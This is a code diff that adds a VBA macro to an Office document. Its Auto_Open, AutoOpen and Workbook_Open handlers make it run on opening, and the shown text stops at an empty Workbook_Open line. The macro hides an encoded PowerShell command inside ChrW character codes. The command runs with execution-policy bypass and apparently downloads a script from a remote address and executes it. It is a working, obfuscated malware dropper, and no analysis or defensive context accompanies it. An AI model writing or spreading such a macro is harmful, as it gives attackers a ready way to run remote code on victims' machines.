@@ -1,0 +1,43 @@
+Sub Auto_Open()
+  Dim first As String
+  Dim second As String
+  Dim third As String
+  Dim fourth As String
+  Dim fifth As String
+  Dim sixth As String
+  Dim seventh As String
+  Dim eighth As String
+  Dim ninth As String
+  Dim tenth As String
+  Dim eleventh As String
+  Dim twelfth As String
+  Dim last As String
+  aa = ChrW(112) & ChrW(111) & ChrW(119) & ChrW(101) & ChrW(114) & ChrW(115) & ChrW(104) & ChrW(101) & ChrW(108) & ChrW(108)
+  bb = ChrW(46) & ChrW(101) & ChrW(120) & ChrW(101) & ChrW(32) & ChrW(45) & ChrW(101) & ChrW(120) & ChrW(101) & ChrW(99)
+  cc = ChrW(32) & ChrW(98) & ChrW(121) & ChrW(112) & ChrW(97) & ChrW(115) & ChrW(115) & ChrW(32) & ChrW(45) & ChrW(101)
+  dd = ChrW(110) & ChrW(99) & ChrW(32) & ChrW(83) & ChrW(81) & ChrW(66) & ChrW(70) & ChrW(65) & ChrW(70) & ChrW(103)
+  ee = ChrW(65) & ChrW(73) & ChrW(65) & ChrW(65) & ChrW(111) & ChrW(65) & ChrW(67) & ChrW(103) & ChrW(65) & ChrW(98)
+  ff = ChrW(103) & ChrW(66) & ChrW(108) & ChrW(65) & ChrW(72) & ChrW(99) & ChrW(65) & ChrW(76) & ChrW(81) & ChrW(66)
+  gg = ChrW(118) & ChrW(65) & ChrW(71) & ChrW(73) & ChrW(65) & ChrW(97) & ChrW(103) & ChrW(66) & ChrW(108) & ChrW(65)
+  hh = ChrW(71) & ChrW(77) & ChrW(65) & ChrW(100) & ChrW(65) & ChrW(65) & ChrW(103) & ChrW(65) & ChrW(71) & ChrW(52)
+  ii = ChrW(65) & ChrW(90) & ChrW(81) & ChrW(66) & ChrW(48) & ChrW(65) & ChrW(67) & ChrW(52) & ChrW(65) & ChrW(100)
+  ll = ChrW(119) & ChrW(66) & ChrW(108) & ChrW(65) & ChrW(71) & ChrW(73) & ChrW(65) & ChrW(89) & ChrW(119) & ChrW(66)
+  mm = ChrW(115) & ChrW(65) & ChrW(71) & ChrW(107) & ChrW(65) & ChrW(90) & ChrW(81) & ChrW(66) & ChrW(117) & ChrW(65)
+  nn = ChrW(72) & ChrW(81) & ChrW(65) & ChrW(75) & ChrW(81) & ChrW(65) & ChrW(117) & ChrW(65) & ChrW(71) & ChrW(81)
+  oo = ChrW(65) & ChrW(98) & ChrW(119) & ChrW(66) & ChrW(51) & ChrW(65) & ChrW(71) & ChrW(52) & ChrW(65) & ChrW(98)
+  pp = ChrW(65) & ChrW(66) & ChrW(118) & ChrW(65) & ChrW(71) & ChrW(69) & ChrW(65) & ChrW(90) & ChrW(65) & ChrW(66)
+  qq = ChrW(122) & ChrW(65) & ChrW(72) & ChrW(81) & ChrW(65) & ChrW(99) & ChrW(103) & ChrW(66) & ChrW(112) & ChrW(65)
+  rr = ChrW(71) & ChrW(52) & ChrW(65) & ChrW(90) & ChrW(119) & ChrW(65) & ChrW(111) & ChrW(65) & ChrW(67) & ChrW(99)
+  ss = ChrW(65) & ChrW(97) & ChrW(65) & ChrW(66) & ChrW(48) & ChrW(65) & ChrW(72) & ChrW(81) & ChrW(65) & ChrW(99)
+  tt = ChrW(65) & ChrW(65) & ChrW(54) & ChrW(65) & ChrW(67) & ChrW(56) & ChrW(65) & ChrW(76) & ChrW(119) & ChrW(65) & ChrW(120)
+  uu = ChrW(65) & ChrW(68) & ChrW(77) & ChrW(65) & ChrW(76) & ChrW(103) & ChrW(65) & ChrW(122) & ChrW(65) & ChrW(68)
+  vv = ChrW(89) & ChrW(65) & ChrW(76) & ChrW(103) & ChrW(65) & ChrW(121) & ChrW(65) & ChrW(68) & ChrW(69) & ChrW(65) & ChrW(77)
+  zz = ChrW(81) & ChrW(65) & ChrW(117) & ChrW(65) & ChrW(68) & ChrW(69) & ChrW(65) & ChrW(78) & ChrW(119) & ChrW(65) & ChrW(50)
+  ab = ChrW(65) & ChrW(67) & ChrW(56) & ChrW(65) & ChrW(99) & ChrW(103) & ChrW(66) & ChrW(122) & ChrW(65) & ChrW(67) & ChrW(52) & ChrW(65) & ChrW(100) & ChrW(65) & ChrW(66) & ChrW(52) & ChrW(65) & ChrW(72) & ChrW(81) & ChrW(65) & ChrW(74) & ChrW(119) & ChrW(65) & ChrW(112) & ChrW(65) & ChrW(67) & ChrW(107) & ChrW(65)
+  last = aa + bb + cc + dd + ee + ff + gg + hh + ii + ll + mm + nn + oo + pp + qq + rr + ss + tt + uu + vv + zz + ab
+  CreateObject("Wscript.Shell").Run last
+End Sub
+Sub AutoOpen()
+  Auto_Open
+End Sub
+Sub Workbook_Open()
